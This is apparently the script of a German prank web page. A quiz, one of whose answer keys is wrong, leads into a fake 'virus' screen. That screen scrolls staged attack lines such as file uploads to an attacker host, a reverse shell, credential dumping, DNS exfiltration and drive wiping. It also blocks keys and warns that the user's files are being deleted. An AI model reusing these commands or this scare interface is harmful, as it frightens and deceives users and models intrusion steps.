// ══════════════════════════════════════
// QUIZ
// ══════════════════════════════════════
const questions = [
  {
    q: "Was ist die Hauptstadt von Australien?",
    answers: ["Sydney", "Melbourne", "Canberra", "Brisbane"],
    correct: 2
  },
  {
    q: "Welches Land hat die meisten Zeitzonen der Welt?",
    answers: ["Russland", "USA", "Frankreich", "China"],
    correct: 2
  },
  {
    q: "Welches ist das schwerste natürliche Element?",
    answers: ["Gold", "Blei", "Osmium", "Plutonium"],
    correct: 2
  },
  {
    q: "🔴 BOSS-FRAGE: Wie viele Sekunden hat ein Schaltjahr?",
    answers: ["31.536.000", "31.622.400", "31.557.600", "31.104.000"],
    correct: 1
  }
];

let currentQuestion = 0;

const quizScreen       = document.getElementById("quizScreen");
const quizContainer    = document.getElementById("quizContainer");
const quizQuestionEl   = document.getElementById("quizQuestion");
const quizAnswersEl    = document.getElementById("quizAnswers");
const quizFeedbackEl   = document.getElementById("quizFeedback");
const quizProgressText = document.getElementById("quizProgressText");
const quizProgressFill = document.getElementById("quizProgressFill");

let shuffledCorrectIndex = 0;

function shuffleAnswers(answers, correctIndex) {
  const indexed = answers.map((a, i) => ({ text: a, original: i }));
  for (let i = indexed.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [indexed[i], indexed[j]] = [indexed[j], indexed[i]];
  }
  const newCorrect = indexed.findIndex(a => a.original === correctIndex);
  return { shuffled: indexed.map(a => a.text), correctIndex: newCorrect };
}

function showQuestion(index) {
  const q = questions[index];
  quizQuestionEl.textContent = q.q;
  const isBoss = index === questions.length - 1;
  quizProgressText.textContent = isBoss ? "🔴 BOSS-FRAGE" : `Frage ${index + 1} von ${questions.length}`;
  quizProgressFill.style.width = `${(index / questions.length) * 100}%`;
  quizFeedbackEl.textContent = "";
  quizFeedbackEl.className = "quiz-feedback";

  const { shuffled, correctIndex } = shuffleAnswers(q.answers, q.correct);
  shuffledCorrectIndex = correctIndex;

  quizAnswersEl.innerHTML = "";
  shuffled.forEach((answer, i) => {
    const btn = document.createElement("button");
    btn.className = "quiz-answer-btn";
    btn.textContent = answer;
    btn.addEventListener("click", () => handleAnswer(i, btn));
    quizAnswersEl.appendChild(btn);
  });
}

function handleAnswer(index, btn) {
  quizAnswersEl.querySelectorAll(".quiz-answer-btn").forEach(b => b.disabled = true);
  const q = questions[currentQuestion];

  if (index === shuffledCorrectIndex) {
    btn.classList.add("correct");
    quizFeedbackEl.textContent = "✓ Richtig!";
    currentQuestion++;

    if (currentQuestion >= questions.length) {
      setTimeout(showTransferScreen, 900);
    } else {
      setTimeout(() => showQuestion(currentQuestion), 1000);
    }
  } else {
    btn.classList.add("wrong");
    quizFeedbackEl.className = "quiz-feedback error";
    quizFeedbackEl.textContent = "✗ FALSCHE ANTWORT! Zugriff wird gestartet...";
    setTimeout(launchVirus, 1600);
  }
}

function showTransferScreen() {
  quizContainer.innerHTML = `
    <div class="quiz-transfer">
      <div class="quiz-transfer-icon">💸</div>
      <div class="quiz-transfer-title">GLÜCKWUNSCH!</div>
      <div class="quiz-transfer-amount">$1.000.000</div>
      <p style="color:#9eaecf;margin:0 0 16px">Wird auf Ihr Konto übertragen...</p>
      <div class="quiz-transfer-bar">
        <div class="quiz-transfer-fill" id="transferFill" style="transition:none"></div>
      </div>
      <p class="quiz-transfer-status" id="transferStatus">Verbinde mit Bankserver... 0%</p>
    </div>
  `;

  const statusEl = document.getElementById("transferStatus");
  const fillEl   = document.getElementById("transferFill");

  const messages = [
    "Verbinde mit Bankserver...",
    "Identität wird verifiziert...",
    "Betrag wird vorbereitet...",
    "Übertragung läuft...",
    "Fast fertig..."
  ];

  let percent = 0;
  const interval = setInterval(() => {
    percent++;
    fillEl.style.width = percent + "%";
    const msg = messages[Math.floor((percent / 98) * (messages.length - 1))];
    statusEl.textContent = msg + " " + percent + "%";

    if (percent >= 98) {
      clearInterval(interval);
      setTimeout(() => {
        quizContainer.innerHTML = `
          <div style="text-align:center">
            <div style="font-size:4rem;margin-bottom:16px">📡</div>
            <div style="font-size:1.8rem;font-weight:700;color:#ff5b73;margin-bottom:10px">Kein Internet</div>
            <p style="color:#9eaecf;font-size:0.95rem">Die Verbindung zum Server wurde unterbrochen.<br>Übertragung fehlgeschlagen.</p>
          </div>
        `;
        setTimeout(launchVirus, 1800);
      }, 600);
    }
  }, 40);
}

function launchVirus() {
  quizScreen.classList.add("hidden");
  setTimeout(() => { quizScreen.style.display = "none"; }, 500);
  startVirus();
}

// Show first question immediately
showQuestion(0);


// ══════════════════════════════════════
// VIRUS
// ══════════════════════════════════════
const terminalOutput = document.getElementById("terminalOutput");
const progressBar    = document.getElementById("progressBar");
const chaosPercent   = document.getElementById("chaosPercent");
const alertsList     = document.getElementById("alertsList");
const runawayControl = document.getElementById("runawayControl");
const checkboxStage  = document.getElementById("checkboxStage");
const escapeBox      = document.getElementById("escapeBox");
const revealButton   = document.getElementById("revealButton");
const revealCopy     = document.getElementById("revealCopy");
const popupContainer = document.getElementById("popupContainer");
const redFlash       = document.getElementById("redFlash");
const screenShake    = document.getElementById("screenShake");
const fsOverlay      = document.getElementById("fsOverlay");
const countdownEl    = document.getElementById("countdown");
const filesLeftEl    = document.getElementById("filesLeft");
const userIPEl       = document.getElementById("userIP");
const userOSEl       = document.getElementById("userOS");
const userBrowserEl  = document.getElementById("userBrowser");

let currentLine      = 0;
let currentChaos     = 0;
let revealed         = false;
let popupCount       = 0;
let countdownSeconds = 600;
let totalFiles       = 24847 + Math.floor(Math.random() * 8000);
let filesDeleted     = 0;

let terminalTimer, chaosTimer, popupTimer, flashTimer, countdownTimer, shakeTimer, titleTimer;

function detectOS() {
  const ua = navigator.userAgent;
  if (ua.includes("Windows NT 10")) return "Windows 10/11";
  if (ua.includes("Windows"))        return "Windows";
  if (ua.includes("Mac"))            return "macOS";
  if (ua.includes("Linux"))          return "Linux";
  return "Unknown OS";
}
function detectBrowser() {
  const ua = navigator.userAgent;
  if (ua.includes("Edg/"))    return "Microsoft Edge";
  if (ua.includes("Chrome"))  return "Google Chrome";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Safari"))  return "Safari";
  return "Unknown";
}
function generateFakeIP() {
  return `${Math.floor(Math.random()*200)+10}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

function makeTimestamp() {
  return new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
}

function appendTerminalLine(text) {
  const line    = document.createElement("div");
  line.className = "terminal-line";
  const time    = document.createElement("span");
  time.className = "terminal-time";
  time.textContent = `[${makeTimestamp()}]`;
  const message = document.createElement("span");
  message.textContent = text;
  if      (text.startsWith("FOUND") || text.startsWith("CAPTURED") || text.startsWith("EXTRACTED"))
    message.style.color = "#ff5b73";
  else if (text.startsWith("UPLOADING") || text.startsWith("ENCRYPTING") || text.startsWith("TRANSFER") || text.startsWith("DELETING") || text.startsWith("FORMAT"))
    message.style.color = "#ffa07a";
  else if (text.startsWith("$"))
    message.style.color = "#7df9c1";
  else if (text.startsWith("INFECTED") || text.startsWith("WORM") || text.startsWith("ROOTKIT") || text.startsWith("BACKDOOR"))
    message.style.color = "#ff5b73";
  else if (text.startsWith("WEBCAM") || text.startsWith("MICROPHONE") || text.startsWith("FIREWALL") || text.startsWith("ANTIVIRUS"))
    message.style.color = "#ffd166";
  line.append(time, message);
  terminalOutput.append(line);
  terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function rotateAlert() {
  const first = alertsList.firstElementChild;
  if (first) first.remove();
  const next = document.createElement("li");
  next.textContent = alertPool[Math.floor(Math.random() * alertPool.length)];
  alertsList.append(next);
}

function tickChaos() {
  currentChaos += 0.3 + Math.random() * 0.8;
  if (currentChaos > 100) currentChaos = 100;
  const display = Math.round(currentChaos);
  progressBar.style.width = `${display}%`;
  chaosPercent.textContent = `${display}%`;
  filesDeleted += Math.floor(Math.random() * 30) + 5;
  if (filesDeleted > totalFiles) filesDeleted = totalFiles;
  filesLeftEl.textContent = (totalFiles - filesDeleted).toLocaleString() + " Dateien";
}

function triggerFlash() {
  if (revealed) return;
  redFlash.classList.add("active");
  setTimeout(() => redFlash.classList.remove("active"), 120);
}

const terminalLines = [
  "$ nmap -sV 192.168.1.0/24 — scanning local network...",
  "PORT 22/tcp OPEN — SSH detected on 192.168.1.1",
  "PORT 3389/tcp OPEN — RDP detected on target machine",
  "$ ssh root@192.168.1.1 — brute forcing credentials...",
  "LOGIN SUCCESS: root:admin123 — access granted",
  "$ cat /etc/shadow — dumping password hashes...",
  "HASH: $6$rounds=5000$salt$Kq8x... — cracking with hashcat",
  "$ mimikatz.exe — extracting Windows credentials from memory",
  "FOUND: Administrator:P@ssw0rd!2024",
  "FOUND: User:bank_login_2024!",
  "$ keylogger --inject --pid 1842 — hooking keyboard input",
  "CAPTURED KEYSTROKES: ****@gmail.com / ********",
  "$ scp -r ~/Documents attacker@194.32.78.11:/loot/",
  "UPLOADING: Documents/taxes_2024.pdf (2.4 MB)...",
  "UPLOADING: Documents/passwords.xlsx (840 KB)...",
  "UPLOADING: Pictures/ (14.2 GB) — 23% complete...",
  "$ netstat -an | grep ESTABLISHED",
  "194.32.78.11:4444 ← REVERSE SHELL ACTIVE",
  "91.203.4.126:8080 ← C2 BEACON CONNECTED",
  "$ reg query HKCU\\Software\\Chrome\\Passwords",
  "EXTRACTED: 47 saved passwords from Chrome",
  "EXTRACTED: 12 saved credit cards from autofill",
  "$ webcam --capture --silent --stream 194.32.78.11",
  "WEBCAM: streaming live to remote server...",
  "$ microphone --record --background",
  "MICROPHONE: recording in progress...",
  "FIREWALL: disabled Windows Defender successfully",
  "ANTIVIRUS: exclusion added for C:\\Windows\\Temp\\payload.exe",
  "$ bitcoin-wallet --scan --extract",
  "FOUND: wallet.dat — balance 0.84 BTC — transferring...",
  "TRANSFER COMPLETE: 0.84 BTC → 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
  "$ ransomware --encrypt --key RSA-4096 --target C:\\Users\\",
  "ENCRYPTING: C:\\Users\\Documents\\ — 847 files...",
  "ENCRYPTING: C:\\Users\\Desktop\\ — 234 files...",
  "ENCRYPTING: C:\\Users\\Pictures\\ — 1,203 files...",
  "$ persistence --install --registry --startup",
  "BACKDOOR: installed to HKLM\\Software\\Microsoft\\Run",
  "$ spread --smb --network 192.168.1.0/24",
  "WORM: spreading to 6 additional devices on network...",
  "INFECTED: DESKTOP-PC4A (192.168.1.105)",
  "INFECTED: LAPTOP-WORK (192.168.1.112)",
  "$ exfil --dns --encode base64 --server c2.darknet.ru",
  "DNS EXFIL: sending data via DNS queries to avoid detection",
  "ROOTKIT: kernel-level rootkit installed — hiding all processes",
  "PRIVILEGE ESCALATION: SYSTEM-level access achieved",
  "$ del /f /s /q C:\\Users\\*.*",
  "DELETING: C:\\Users\\Desktop\\*.* — removing all files...",
  "DELETING: C:\\Users\\AppData\\Local\\Google\\Chrome\\User Data\\",
  "$ format D: /fs:NTFS /q — quick formatting backup drive...",
  "FORMAT COMPLETE: drive D: wiped successfully",
];

const alertPool = [
  "Gelöscht: C:\\Users\\Documents\\familienfotos_2024\\",
  "Gelöscht: C:\\Users\\Desktop\\abschlussarbeit_final.docx",
  "Gelöscht: C:\\Users\\Documents\\steuererklarung\\",
  "Gelöscht: C:\\Users\\Pictures\\ — 1.203 Dateien entfernt",
  "Gelöscht: C:\\Users\\Downloads\\projekt_backup.zip",
  "Gelöscht: C:\\Users\\Documents\\passwoerter.xlsx",
  "Gelöscht: C:\\Users\\Videos\\ — 48 GB entfernt",
  "Gelöscht: C:\\Users\\Music\\ — 2.841 Dateien entfernt",
  "Gelöscht: C:\\Users\\Documents\\arbeit\\vertraege\\",
  "Gelöscht: C:\\Users\\AppData\\Chrome\\gespeicherte_passwoerter.db",
  "Gelöscht: C:\\Users\\Documents\\krankenakte.pdf",
  "Gelöscht: D:\\Backup\\ — gesamtes Laufwerk gelöscht",
];

const popupMessages = [
  { icon: "⚠️",  title: "WARNUNG",               msg: "Deine persönlichen Dateien werden verschlüsselt. Schalte deinen Computer nicht aus." },
  { icon: "🔓",  title: "SICHERHEITSWARNUNG",    msg: "Unbefugter Zugriff erkannt. Deine Passwörter wurden kompromittiert." },
  { icon: "📷",  title: "WEBCAM AKTIV",           msg: "Deine Kamera wird gerade von einem entfernten Benutzer verwendet." },
  { icon: "💳",  title: "ZAHLUNGSDATEN GESTOHLEN", msg: "Kreditkarteninformationen wurden aus deinem Browser extrahiert." },
  { icon: "🔑",  title: "PASSWÖRTER GESTOHLEN",  msg: "47 gespeicherte Passwörter wurden an einen externen Server gesendet." },
  { icon: "📡",  title: "NETZWERK GEHACKT",       msg: "Alle Geräte in deinem Netzwerk wurden kompromittiert." },
  { icon: "🎙️", title: "MIKROFON AKTIV",         msg: "Audio wird aufgenommen und an einen Remote-Server übertragen." },
  { icon: "💀",  title: "RANSOMWARE AKTIV",       msg: "Deine Dateien werden permanent gelöscht, wenn du nicht zahlst." },
  { icon: "🪲",  title: "ROOTKIT ERKANNT",        msg: "Ein Kernel-Rootkit wurde auf diesem System installiert." },
  { icon: "📧",  title: "E-MAIL GEHACKT",         msg: "Deine E-Mail wird verwendet, um Malware an deine Kontakte zu senden." },
  { icon: "🏦",  title: "BANKWARNUNG",            msg: "Verdächtiger Login auf deinem Online-Banking-Konto erkannt." },
  { icon: "⛔",  title: "FIREWALL DEAKTIVIERT",   msg: "Windows Firewall wurde von einem Remote-Prozess deaktiviert." },
];

function spawnPopup() {
  if (revealed) return;
  const data  = popupMessages[Math.floor(Math.random() * popupMessages.length)];
  const popup = document.createElement("div");
  popup.className = "popup";
  popupCount++;
  popup.style.left = Math.max(20, Math.random() * (window.innerWidth  - 340)) + "px";
  popup.style.top  = Math.max(20, Math.random() * (window.innerHeight - 220)) + "px";
  popup.innerHTML =
    '<div class="popup-titlebar"><span>⚠ ' + data.title + '</span><button class="popup-close">✕</button></div>' +
    '<div class="popup-body"><div class="popup-icon">' + data.icon + '</div>' +
    '<p class="popup-message">' + data.msg + '</p>' +
    '<div class="popup-buttons"><button class="popup-btn">Hilfe</button>' +
    '<button class="popup-btn popup-btn--danger">Schließen</button></div></div>';
  popupContainer.append(popup);

  const closeBtn  = popup.querySelector(".popup-close");
  const dangerBtn = popup.querySelector(".popup-btn--danger");
  const helpBtn   = popup.querySelector(".popup-btn");
  const canClose  = Math.random() < 0.65;

  if (canClose) {
    const dismiss = (e) => {
      e.stopPropagation(); popup.remove(); popupCount--;
      setTimeout(() => spawnPopup(), 300);
      setTimeout(() => spawnPopup(), 700);
      if (Math.random() < 0.5) setTimeout(() => spawnPopup(), 1100);
    };
    closeBtn.addEventListener("click", dismiss);
    dangerBtn.addEventListener("click", dismiss);
  } else {
    function dodgePopup() {
      if (revealed) return;
      popup.style.left = Math.max(20, Math.random() * (window.innerWidth  - 340)) + "px";
      popup.style.top  = Math.max(20, Math.random() * (window.innerHeight - 220)) + "px";
    }
    closeBtn.addEventListener("mouseenter", dodgePopup);
    dangerBtn.addEventListener("mouseenter", dodgePopup);
  }
  helpBtn.addEventListener("click", (e) => { e.stopPropagation(); spawnPopup(); spawnPopup(); });
}

function moveRunawayControl(event) {
  const stageRect   = checkboxStage.getBoundingClientRect();
  const controlRect = runawayControl.getBoundingClientRect();
  const pointerX    = event.clientX - stageRect.left;
  const pointerY    = event.clientY - stageRect.top;
  const centerX     = runawayControl.offsetLeft + controlRect.width  / 2;
  const centerY     = runawayControl.offsetTop  + controlRect.height / 2;
  if (Math.abs(pointerX - centerX) >= 90 || Math.abs(pointerY - centerY) >= 50 || revealed) return;
  runawayControl.style.left = Math.max(8, Math.random() * (stageRect.width  - controlRect.width  - 8)) + "px";
  runawayControl.style.top  = Math.max(8, Math.random() * (stageRect.height - controlRect.height - 8)) + "px";
}

function revealJoke() {
  revealed = true;
  document.body.classList.add("reveal-mode");
  escapeBox.checked = true;
  runawayControl.style.left = "18px";
  runawayControl.style.top  = "42px";
  revealCopy.textContent = "Verbindung getrennt. Remote-Sitzung könnte noch aktiv sein.";
  appendTerminalLine("$ kill -9 reverse_shell — Verbindung vom Remote-Host getrennt");
  clearInterval(popupTimer); clearInterval(flashTimer);
  clearInterval(shakeTimer); clearInterval(countdownTimer); clearInterval(titleTimer);
  popupContainer.innerHTML = "";
  redFlash.classList.remove("active");
  screenShake.classList.remove("shaking");
  document.title = "Systemwiederherstellung";
}

function showSafeScreen() {
  revealed = true;
  clearInterval(terminalTimer); clearInterval(chaosTimer);
  clearInterval(popupTimer);    clearInterval(flashTimer);
  clearInterval(shakeTimer);    clearInterval(countdownTimer); clearInterval(titleTimer);
  popupContainer.innerHTML = "";
  redFlash.classList.remove("active");
  screenShake.classList.remove("shaking");
  document.getElementById("safeScreen").classList.add("active");
  document.title = "Du bist sicher";
  try { document.exitFullscreen().catch(() => {}); } catch(e) {}
}

// ── Keyboard / mouse blocking ──
document.addEventListener("keydown", (e) => {
  if (revealed) return;
  if (e.key === "n" || e.key === "N") { showSafeScreen(); return; }
  if (e.key === "Escape") { e.preventDefault(); e.stopPropagation(); spawnPopup(); return; }
  if ((e.ctrlKey && (e.key === "w" || e.key === "t" || e.key === "l")) || e.key === "F5") {
    e.preventDefault(); spawnPopup();
  }
});
document.addEventListener("contextmenu", (e) => { if (!revealed) { e.preventDefault(); spawnPopup(); } });
window.addEventListener("beforeunload", (e) => {
  if (!revealed) {
    e.preventDefault();
    e.returnValue = "Deine Dateien werden noch gelöscht. Das Schließen dieses Fensters stoppt den Prozess NICHT.";
  }
  [terminalTimer,chaosTimer,popupTimer,flashTimer,countdownTimer,shakeTimer,titleTimer].forEach(clearInterval);
});

// ── Fullscreen overlay ──
fsOverlay.addEventListener("click", (e) => {
  e.stopPropagation();
  tapCount = 0;
  fsOverlay.classList.add("hidden");
  try { document.documentElement.requestFullscreen().catch(() => {}); } catch(e) {}
});

// ── Event listeners ──
checkboxStage.addEventListener("mousemove", moveRunawayControl);
checkboxStage.addEventListener("touchstart", revealJoke, { passive: true });
escapeBox.addEventListener("click",      (e) => { if (!revealed) e.preventDefault(); });
runawayControl.addEventListener("click", (e) => { if (!revealed) e.preventDefault(); });
revealButton.addEventListener("click", revealJoke);
document.getElementById("secretExit").addEventListener("click", showSafeScreen);

// Triple-click safe screen
let tapCount = 0, tapTimer = null;
document.addEventListener("click", () => {
  if (revealed) return;
  tapCount++;
  clearTimeout(tapTimer);
  if (tapCount >= 3) { tapCount = 0; showSafeScreen(); }
  else { tapTimer = setTimeout(() => { tapCount = 0; }, 600); }
});

// ══════════════════════════════════════
// START VIRUS (called after quiz)
// ══════════════════════════════════════
function startVirus() {
  userOSEl.textContent      = detectOS();
  userBrowserEl.textContent = detectBrowser();
  userIPEl.textContent      = generateFakeIP();
  filesLeftEl.textContent   = totalFiles.toLocaleString() + " Dateien";

  appendTerminalLine("$ ./exploit --target localhost --payload reverse_shell");
  appendTerminalLine("CONNECTION ESTABLISHED — remote access granted");

  let titleFlash = false;
  titleTimer = setInterval(() => {
    if (revealed) return;
    titleFlash = !titleFlash;
    document.title = titleFlash ? "⚠ VIRUS ERKANNT ⚠" : "⚠ DEINE DATEIEN WERDEN GELÖSCHT";
  }, 800);

  countdownTimer = setInterval(() => {
    if (revealed) return;
    countdownSeconds = Math.max(0, countdownSeconds - 1);
    const min = Math.floor(countdownSeconds / 60);
    const sec = countdownSeconds % 60;
    countdownEl.textContent = `${min}:${sec.toString().padStart(2, "0")}`;
  }, 1000);

  shakeTimer = setInterval(() => {
    if (revealed) return;
    if (Math.random() < 0.3) {
      screenShake.classList.add("shaking");
      setTimeout(() => screenShake.classList.remove("shaking"), 200 + Math.random() * 300);
    }
  }, 4000);

  flashTimer = setInterval(() => { if (Math.random() < 0.6) triggerFlash(); }, 3000);

  terminalTimer = setInterval(() => {
    appendTerminalLine(terminalLines[Math.floor(Math.random() * terminalLines.length)]);
    currentLine++;
    if (currentLine % 15 === 0)
      appendTerminalLine("$ echo 'YOU HAVE BEEN HACKED' > C:\\Users\\%USERNAME%\\Desktop\\README.txt");
  }, 400);

  chaosTimer = setInterval(() => { tickChaos(); rotateAlert(); }, 800);

  popupTimer = setInterval(() => { if (popupCount < 15) spawnPopup(); }, 4000);
  setTimeout(() => spawnPopup(), 800);
  setTimeout(() => spawnPopup(), 2000);
}
